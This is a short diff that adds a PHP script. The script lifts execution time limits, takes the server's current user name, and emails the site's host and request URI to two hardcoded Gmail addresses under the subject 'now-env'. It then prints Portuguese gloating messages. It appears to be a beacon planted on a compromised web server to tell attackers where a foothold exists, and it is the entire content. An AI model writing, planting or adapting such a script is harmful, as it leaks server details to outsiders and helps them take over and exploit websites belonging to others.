@@ -1,0 +1,18 @@
+<?php
+
+ ini_set("max_execution_time",-1);
+ set_time_limit(0);
+ $user = @get_current_user();
+ $email = "$user";
+ $assunto = "now-env";
+ $email1 = "ispaikdanet@gmail.com, pretaloka15@gmail.com";
+ $headers  = "From: <$email>\r\n";
+ if(mail($email1, $assunto, $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'], $headers)){
+ echo "peguei o anel de um!:]";
+ exit();
+}
+ else{
+ echo "pegaro meu anel:(";
+ exit();
+ }
+?>
